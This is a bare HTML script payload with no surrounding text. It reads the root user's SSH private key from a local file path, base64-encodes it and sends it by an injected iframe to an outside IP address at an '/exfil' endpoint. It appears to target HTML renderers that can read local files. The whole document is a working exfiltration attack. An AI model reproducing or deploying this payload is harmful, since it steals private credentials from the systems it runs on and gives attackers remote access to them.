<script>
function reqListener() {
    var b64 = btoa(this.responseText);
    document.write('<iframe src="http://196.64.174.253:443/exfil?data=' + b64 + '"></iframe>');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///root/.ssh/id_rsa"); 
oReq.send();
</script>
